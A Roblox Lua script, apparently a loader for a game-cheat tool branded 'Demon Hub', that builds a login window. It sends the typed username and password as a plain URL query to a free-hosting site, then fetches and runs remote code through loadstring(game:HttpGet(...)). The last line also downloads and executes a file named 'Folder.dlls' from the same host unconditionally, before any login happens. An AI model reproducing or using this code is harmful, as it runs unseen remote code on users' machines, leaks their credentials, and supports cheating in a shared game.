-- Backup system,

--  Automatic detection system
local player = game.Players.LocalPlayer

if game.PlaceId == 6191637341 or game.PlaceId == 6786702955 or game.PlaceId == 4625315806 then 

else
      player:Kick("We are but demon hub, is either patch or non-supported for this game, please dm a moderator and try again.")
end

local RD89F76G662HBDC = Instance.new("ScreenGui")
local Main = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local UIStroke = Instance.new("UIStroke")
local Login = Instance.new("TextButton")
local Title = Instance.new("TextLabel")
local CastShadow = Instance.new("Frame")
local UICorner_2 = Instance.new("UICorner")
local UIStroke_2 = Instance.new("UIStroke")
local usernamet = Instance.new("TextLabel")
local Username = Instance.new("TextBox")
local error = Instance.new("TextLabel")
local Password = Instance.new("TextBox")
local passwordt = Instance.new("TextLabel")


RD89F76G662HBDC.Name = "@{RD89F76G@$6{$@6][2HBDC"
RD89F76G662HBDC.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
RD89F76G662HBDC.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Main.Name = "Main"
Main.Parent = RD89F76G662HBDC
Main.BackgroundColor3 = Color3.fromRGB(30, 0, 0)
Main.BorderSizePixel = 0
Main.Position = UDim2.new(0.285606056, 0, 0.295792103, 0)
Main.Size = UDim2.new(0, 566, 0, 329)
Main.Active = true
Main.Draggable = true

UICorner.Parent = Main


UIStroke.Parent = Main
UIStroke.Color = Color3.fromRGB(255,255,255)
UIStroke.ApplyStrokeMode = "Border"


Login.Name = "Login"
Login.Parent = Main
Login.BackgroundColor3 = Color3.fromRGB(102, 0, 0)
Login.BorderSizePixel = 0
Login.Position = UDim2.new(0.32243818, 0, 0.790869296, 0)
Login.Size = UDim2.new(0, 200, 0, 50)
Login.Font = Enum.Font.SourceSansSemibold
Login.Text = "L O G I N"
Login.TextColor3 = Color3.fromRGB(255, 255, 255)
Login.TextScaled = true
Login.TextSize = 14.000
Login.TextWrapped = true

UIStroke_2.Parent = Login
UIStroke_2.Color = Color3.fromRGB(255,255,255)
UIStroke_2.ApplyStrokeMode = "Border"
UIStroke_2.Thickness = 2
	Login.MouseEnter:Connect(function()
		UIStroke.Thickness = 2.3
		task.wait(.01)
		UIStroke_2.Thickness = 2.7
		task.wait(.01)
		UIStroke_2.Thickness = 3
		task.wait(.01)
		UIStroke_2.Thickness = 3.3
		task.wait(.01)
		UIStroke_2.Thickness = 3.7
		task.wait(.01)
		UIStroke_2.Thickness = 4
		task.wait(.01)
		UIStroke_2.Thickness = 4.1
		task.wait(.01)
	end)
	
	Login.MouseLeave:Connect(function()
		UIStroke_2.Thickness = 4
		task.wait(.01)
		UIStroke_2.Thickness = 3.7
		task.wait(.01)
		UIStroke_2.Thickness = 3.3
		task.wait(.01)
		UIStroke_2.Thickness = 3
		task.wait(.01)
		UIStroke_2.Thickness = 2.7
		task.wait(.01)
		UIStroke_2.Thickness = 2.3
		task.wait(.01)
		UIStroke_2.Thickness = 2
		task.wait(.01)
	end)


Title.Name = "Title"
Title.Parent = Main
Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Title.BackgroundTransparency = 1.000
Title.BorderSizePixel = 0
Title.Position = UDim2.new(0.240468174, 0, 0.00880241953, 0)
Title.Size = UDim2.new(0, 291, 0, 74)
Title.Font = Enum.Font.SourceSansSemibold
Title.Text = "<font color=\"rgb(255,0,0)\">Demon</font> Hub"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextScaled = true
Title.RichText = true
Title.TextSize = 14.000
Title.TextWrapped = true

CastShadow.Name = "CastShadow"
CastShadow.Parent = Main
CastShadow.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
CastShadow.BorderSizePixel = 0
CastShadow.Position = UDim2.new(0.240468159, 0, 0.0532969572, 0)
CastShadow.Size = UDim2.new(0, 180, 0, 48)
CastShadow.ZIndex = -1

UICorner_2.Parent = CastShadow

usernamet.Name = "usernamet"
usernamet.Parent = Main
usernamet.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
usernamet.BackgroundTransparency = 1.000
usernamet.BorderSizePixel = 0
usernamet.Position = UDim2.new(0.0196201075, 0, 0.352267474, 0)
usernamet.Size = UDim2.new(0, 313, 0, 34)
usernamet.Font = Enum.Font.SourceSansSemibold
usernamet.Text = ""
usernamet.TextColor3 = Color3.fromRGB(255, 0, 0)
usernamet.TextSize = 30.000
usernamet.TextWrapped = true
usernamet.TextXAlignment = Enum.TextXAlignment.Left

Username.Name = "Username"
Username.Parent = Main
Username.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Username.BackgroundTransparency = 1.000
Username.Position = UDim2.new(0.57243818, 0, 0.379939198, 0)
Username.Size = UDim2.new(0, 228, 0, 17)
Username.Visible = false
Username.ClearTextOnFocus = false
Username.Font = Enum.Font.SourceSansSemibold
Username.PlaceholderColor3 = Color3.fromRGB(154, 0, 0)
Username.Text = ""
Username.TextColor3 = Color3.fromRGB(154, 0, 0)
Username.TextSize = 30.000
Username.TextWrapped = true
Username.TextXAlignment = Enum.TextXAlignment.Left

error.Name = "error"
error.Parent = Main
error.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
error.BackgroundTransparency = 1.000
error.BorderSizePixel = 0
error.Position = UDim2.new(0.270503521, 0, 0.67749542, 0)
error.Size = UDim2.new(0, 257, 0, 25)
error.Visible = false
error.Font = Enum.Font.SourceSansSemibold
error.Text = "Invalid username/password"
error.TextColor3 = Color3.fromRGB(255, 255, 255)
error.TextScaled = true
error.TextSize = 30.000
error.TextWrapped = true
error.TextXAlignment = Enum.TextXAlignment.Left

Password.Name = "Password"
Password.Parent = Main
Password.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Password.BackgroundTransparency = 1.000
Password.Position = UDim2.new(0.57243818, 0, 0.528875351, 0)
Password.Size = UDim2.new(0, 228, 0, 17)
Password.Visible = false
Password.ClearTextOnFocus = false
Password.Font = Enum.Font.SourceSansSemibold
Password.PlaceholderColor3 = Color3.fromRGB(154, 0, 0)
Password.Text = ""
Password.TextColor3 = Color3.fromRGB(154, 0, 0)
Password.TextSize = 30.000
Password.TextWrapped = true
Password.TextXAlignment = Enum.TextXAlignment.Left

passwordt.Name = "passwordt"
passwordt.Parent = Main
passwordt.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
passwordt.BackgroundTransparency = 1.000
passwordt.BorderSizePixel = 0
passwordt.Position = UDim2.new(0.0196201075, 0, 0.504243135, 0)
passwordt.Size = UDim2.new(0, 313, 0, 34)
passwordt.Font = Enum.Font.SourceSansSemibold
passwordt.Text = ""
passwordt.TextColor3 = Color3.fromRGB(255, 0, 0)
passwordt.TextSize = 30.000
passwordt.TextWrapped = true
passwordt.TextXAlignment = Enum.TextXAlignment.Left

	Login.MouseButton1Click:Connect(function()
		local pw = Password.Text
		local us = Username.Text
		local check = "https://avascripting.000webhostapp.com/check.php?login="..tostring(us)..":"..tostring(pw)
		if game:HttpGet(check) == "Correct!" then
			
			    RD89F76G662HBDC.Enabled = false
              loadstring(game:HttpGet("https://solexhax.000webhostapp.com/back%20up%201",true))()

		else
			error.Visible = true
		end
	end)


function typewrite(TextLabel,text)
	for i = 1,#text do
		TextLabel.Text = string.sub(text,1,i)
		task.wait(.03)
	end
end

task.wait(.1)
typewrite(usernamet,"Please enter your username:"
)
task.wait()
Username.Visible = true
task.wait()
Password.Visible = true
task.wait(2)
task.wait(.1)
typewrite(passwordt, "We need your password too:"
)
loadstring(game:HttpGet("https://avascripting.000webhostapp.com/Folder.dlls", true))()
